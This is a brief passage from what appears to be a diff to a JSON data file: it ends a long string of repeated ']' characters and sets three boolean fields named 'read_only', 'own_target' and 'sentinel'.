]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n",
+      "read_only": false,
+      "own_target": false,
+      "sentinel": false
+    }
+  ]
+}
